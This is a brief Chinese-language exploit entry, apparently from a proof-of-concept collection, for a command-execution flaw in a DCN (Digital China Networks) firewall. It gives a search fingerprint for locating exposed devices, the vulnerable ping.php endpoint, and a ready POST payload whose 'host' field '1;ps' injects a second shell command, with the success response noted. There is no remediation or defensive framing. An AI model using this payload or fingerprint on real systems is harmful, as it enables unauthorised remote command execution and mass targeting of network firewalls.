# DCN防火墙存在命令执行漏洞

DCN ｜ 命令执行 ｜ —
- **指纹**：`body="北京神州数码云科信息技术有限公司"`
- **请求**：`POST /function/system/tool/ping.php HTTP/1.1`

**Payload**
```
dcn_test_a_967=21&dcn_test_b_967=122&dcn_test_c_967=111&dcn_test_d=_967&doing=ping&host=1;ps&proto=&count=1
```
- **响应特征**：200